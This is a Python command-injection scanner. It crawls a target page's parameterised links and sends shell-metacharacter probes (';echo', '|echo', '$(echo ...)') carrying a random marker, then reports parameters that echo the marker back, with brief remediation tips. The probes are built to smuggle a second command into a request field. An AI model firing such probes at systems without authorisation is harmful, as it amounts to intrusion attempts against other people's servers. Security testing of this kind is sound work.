#!/usr/bin/env python3
import sys
import requests
import urllib.parse
import random
import string
import time
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from requests.exceptions import RequestException

requests.packages.urllib3.disable_warnings()

def command_injection_exploiter(target):
    """Test for Command Injection vulnerabilities in a web application."""
    print(f"[+] Command Injection Vulnerability Scanner for: {target}")
    print("-" * 60)

    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    scan_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    test_payloads = [
        f";echo{scan_id}",
        f"&echo{scan_id}",
        f"|echo{scan_id}",
        f"`echo {scan_id}`",
        f"$(echo {scan_id})",
        f"||echo{scan_id}",
        f"&&echo{scan_id}"
    ]

    results = {
        "target": target,
        "injection_points": [],
        "vulnerable_params": [],
        "scan_id": scan_id
    }

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    })

    try:
        print("[+] Fetching target page...")
        response = session.get(target, timeout=15, verify=False)
        if response.status_code != 200:
            print(f"[-] Failed to access target. Status code: {response.status_code}")
            return

        print(f"[+] Successfully accessed target (Status: {response.status_code}, Length: {len(response.text)})")
        soup = BeautifulSoup(response.text, 'html.parser')

        print("\n[+] Identifying URL parameters...")
        links = soup.find_all('a', href=True)
        urls_to_test = []

        for link in links:
            href = link['href']
            if href.startswith('/'):
                parsed_target = urlparse(target)
                href = f"{parsed_target.scheme}://{parsed_target.netloc}{href}"
            elif not href.startswith(('http://', 'https://')):
                href = urllib.parse.urljoin(target, href)

            parsed_url = urlparse(href)
            if parsed_url.query:
                urls_to_test.append(href)
                print(f"  [*] Found URL with parameters: {href}")

        if urls_to_test:
            print(f"\n[+] Testing {len(urls_to_test)} URLs with parameters for Command Injection...")

            for url in urls_to_test:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)

                for param in query_params:
                    print(f"  [*] Testing parameter: {param}")

                    for payload in test_payloads:
                        new_params = query_params.copy()
                        new_params[param] = [payload]
                        new_query = urlencode(new_params, doseq=True)
                        new_url = urlunparse((
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            new_query,
                            parsed_url.fragment
                        ))

                        try:
                            test_response = session.get(new_url, timeout=15, verify=False)
                            if scan_id in test_response.text:
                                print(f"    [!!!] VULNERABLE: Parameter '{param}' at {new_url}")
                                results["vulnerable_params"].append({
                                    "url": url,
                                    "parameter": param,
                                    "payload": payload
                                })
                                results["injection_points"].append({
                                    "type": "url_parameter",
                                    "url": url,
                                    "parameter": param
                                })
                                break  # Found, no need to test more payloads
                        except RequestException as e:
                            print(f"    [-] Error testing {new_url}: {str(e)}")

        else:
            print("[-] No URLs with parameters found to test.")

        print("\n" + "=" * 60)
        print("COMMAND INJECTION SCAN SUMMARY")
        print("=" * 60)
        print(f"Target: {target}")
        print(f"Scan ID: {scan_id}")

        if results["injection_points"]:
            print(f"\nFound {len(results['injection_points'])} potential injection points:")
            for point in results["injection_points"]:
                print(f"  - URL Parameter: {point['parameter']} in {point['url']}")
        else:
            print("\nNo injection points found.")

        if results["vulnerable_params"]:
            print("\nVULNERABLE PARAMETERS:")
            for vuln in results["vulnerable_params"]:
                print(f"  - {vuln['parameter']} at {vuln['url']}")
                print(f"    Payload: {vuln['payload']}")
        else:
            print("\nNo confirmed command injection vulnerabilities found.")

        print("\nPOTENTIAL REMEDIATION:")
        print("  - Validate and sanitize user input strictly")
        print("  - Avoid using system calls with user data")
        print("  - Use parameterized APIs or safe libraries")

        return results

    except Exception as e:
        print(f"[-] An error occurred during the scan: {str(e)}")
        return None

def main():
    """Main function to run the Command Injection tester."""
    if len(sys.argv) < 2:
        print("Usage: python command_injection_exploiter.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    command_injection_exploiter(target)

if __name__ == "__main__":
    main()
